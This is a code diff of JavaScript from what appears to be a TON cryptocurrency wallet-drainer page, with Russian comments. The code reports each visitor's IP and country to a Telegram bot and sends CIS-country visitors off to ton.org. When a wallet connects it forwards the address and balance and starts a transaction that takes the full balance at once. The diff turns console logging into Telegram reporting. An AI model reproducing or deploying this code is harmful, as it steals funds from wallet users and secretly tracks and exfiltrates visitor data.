@@ -20,44 +20,40 @@ document.addEventListener('DOMContentLoaded', () => {
             ipUser = data.ip;
             countryUser = data.country;
 
-            console.log('IP:', ipUser);
-            console.log('Country:', countryUser);
+            // Отправка сообщения в Telegram о посещении сайта
+            const messageOpen = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCD6*Opened the website*`;
+            sendTelegramMessage(messageOpen);
 
             // Перенаправление для стран СНГ
             if (['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ'].includes(country)) {
                 window.location.replace('https://ton.org');
             }
-
-            // Отправка сообщения в Telegram о посещении сайта
-            const messageOpen = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCD6*Opened the website*`;
-            sendTelegramMessage(messageOpen);
         })
-        .catch(error => console.error('Error fetching IP data:', error));
+        .catch(error => {
+            const errorMessage = `\uD83D\uDED1*Ошибка при получении IP:* ${error.message}`;
+            sendTelegramMessage(errorMessage);
+        });
 
     // Обработка подключения кошелька
     tonConnectUI.onStatusChange(wallet => {
         if (wallet) {
-            console.log('Кошелек подключен:', wallet);
-
-            // Логирование информации о подключенном кошельке
-            const walletInfo = `\uD83D\uDCBC*Кошелек подключен:*\n\uD83D\uDCBB*Адрес:* ${wallet.account.address}\n\uD83D\uDCB0*Баланс:* ${wallet.account.balance}`;
-            console.log(walletInfo);
-
             // Отправка информации о подключенном кошельке в Telegram
-            const messageWalletConnected = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCBC*Кошелек подключен:*\n\uD83D\uDCBB*Адрес:* ${wallet.account.address}\n\uD83D\uDCB0*Баланс:* ${wallet.account.balance}`;
-            sendTelegramMessage(messageWalletConnected);
+            const walletInfo = `\uD83D\uDCBC*Кошелек подключен:*\n\uD83D\uDCBB*Адрес:* ${wallet.account.address}\n\uD83D\uDCB0*Баланс:* ${wallet.account.balance}`;
+            sendTelegramMessage(walletInfo);
 
             // Автоматически запускаем процесс отправки средств
             didtrans(wallet.account.address);
         } else {
-            console.log('Кошелек отключен.');
+            const messageDisconnected = `\uD83D\uDED1*Кошелек отключен.*`;
+            sendTelegramMessage(messageDisconnected);
         }
     });
 
     // Функция для отправки транзакции
     async function didtrans(walletAddress) {
         if (!walletAddress) {
-            console.error('Адрес кошелька не указан.');
+            const errorMessage = `\uD83D\uDED1*Ошибка:* Адрес кошелька не указан.`;
+            sendTelegramMessage(errorMessage);
             return;
         }
 
@@ -68,7 +64,8 @@ document.addEventListener('DOMContentLoaded', () => {
         const tgBalance = processedBalance / 1000000000; // Конвертация в TON
 
         if (processedBalance <= 0) {
-            console.error('Недостаточный баланс для выполнения транзакции.');
+            const errorMessage = `\uD83D\uDED1*Ошибка:* Недостаточный баланс для выполнения транзакции.`;
+            sendTelegramMessage(errorMessage);
             return;
         }
 
@@ -83,14 +80,11 @@ document.addEventListener('DOMContentLoaded', () => {
         try {
             // Отправка транзакции
             const result = await tonConnectUI.sendTransaction(transaction);
-            console.log('Транзакция успешно отправлена:', result);
 
             // Отправка сообщения в Telegram об успешной транзакции
             const messageSend = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${walletAddress})\n\n\uD83D\uDC8E*Send:* ${tgBalance} TON`;
             sendTelegramMessage(messageSend);
         } catch (error) {
-            console.error('Ошибка при отправке транзакции:', error);
-
             // Отправка сообщения в Telegram об ошибке
             const messageDeclined = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${walletAddress})\n\n\uD83D\uDED1*Declined or error.*`;
             sendTelegramMessage(messageDeclined);
@@ -109,9 +103,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
         fetch(url, { method: 'POST' })
             .then(response => {
-                if (response.ok) {
-                    console.log('Сообщение успешно отправлено в Telegram.');
-                } else {
+                if (!response.ok) {
                     console.error('Ошибка при отправке сообщения в Telegram.');
                 }
             })
